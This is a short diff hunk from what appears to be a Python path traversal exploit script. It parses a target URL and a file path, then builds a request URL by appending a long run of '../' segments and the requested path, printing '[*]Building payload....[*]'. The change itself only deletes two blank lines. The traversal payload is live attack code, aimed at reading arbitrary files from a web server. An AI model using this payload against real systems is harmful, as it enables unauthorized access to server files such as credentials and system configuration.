@@ -18,8 +18,6 @@ parser.add_argument("-p", "--path", required=True, help="Enter the full path of 
 
 args = parser.parse_args()
 
-
-
 payload = '../../../../../../../../../../../../../'
 url = args.url + payload + args.path
 print("[*]Building payload....[*]\n")
